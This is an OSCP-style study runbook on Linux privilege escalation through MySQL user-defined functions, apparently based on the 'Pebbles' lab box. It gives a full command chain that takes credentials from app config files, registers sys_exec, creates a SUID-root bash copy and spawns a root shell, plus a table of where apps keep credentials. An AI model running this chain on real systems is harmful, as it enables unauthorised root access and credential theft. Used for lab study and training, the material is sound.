---
tags: [oscp, privesc, linux, mysql, udf, runbook]
box_sources: [Pebbles]
---

# PrivEsc Linux — MySQL UDF

*You have MySQL root credentials. MySQL process is running as the root OS user. User-Defined Functions (UDF) let you execute OS commands through MySQL — as root.*

---

## Confirm MySQL is Running as Root

```bash
ps aux | grep mysql
```

Look for `root` in the first column against the `mysqld` process.

---

## Technique Table

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `mysql -u root -p$Password -e "SELECT sys_exec('id > /tmp/out.txt');"` then `cat /tmp/out.txt` | `uid=0(root)` in output file | `sys_exec` UDF already registered (loaded by ZoneMinder or prior work) | If sys_exec not registered, load it manually (see below). `sys_exec` returns an int, not stdout — redirect output to a temp file to confirm it ran. | Create SUID bash | Function not found → register UDF manually |
| `mysql -u root -p$Password -e "SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');"` | `/tmp/rootbash` exists with `-rwsr-xr-x root root` | sys_exec works + MySQL runs as root | Creates a SUID copy of bash owned by root. | `/tmp/rootbash -p` → [[PrivEsc Linux - SUID]] | Permission denied → MySQL not running as root |

---

## Register UDF Manually (if sys_exec not already loaded)

Find the library:

```bash
find / -name "lib_mysqludf_sys*" 2>/dev/null
# Usually: /usr/lib/lib_mysqludf_sys.so
```

Load it into MySQL:

```sql
USE mysql;
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
```

Verify:

```sql
SELECT sys_exec('id > /tmp/out.txt');
```

---

## Full Chain (Pebbles)

```bash
# 1. Find creds
cat /etc/zm/zm.conf | grep DB_

# 2. Connect as root
mysql -u root -pShinyLucentMarker361 zm

# 3. Check if sys_exec exists
SELECT * FROM mysql.func WHERE name='sys_exec';

# 4. If not, register it
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';

# 5. Create SUID bash
SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');

# 6. Confirm
exit
ls -la /tmp/rootbash

# 7. Escalate
/tmp/rootbash -p
id  # euid=0(root)
```

---

## Why MySQL Creds Live in App Configs

Web apps that use MySQL store credentials in plaintext config files. Always check:

| App | Config location |
|---|---|
| ZoneMinder | `/etc/zm/zm.conf` |
| WordPress | `/var/www/html/wp-config.php` |
| Drupal | `/var/www/html/sites/default/settings.php` |
| Generic | `/var/www/html/config.php`, `.env`, `database.yml` |

---

## Module Links

[[18. Linux Privilege Escalation]] | [[10. SQL Injection Attacks]]

---

## External Resources

- [HackTricks - MySQL UDF](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting/pentesting-mysql.md)
- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [GTFOBins - bash SUID](https://gtfobins.github.io/gtfobins/bash/#suid)
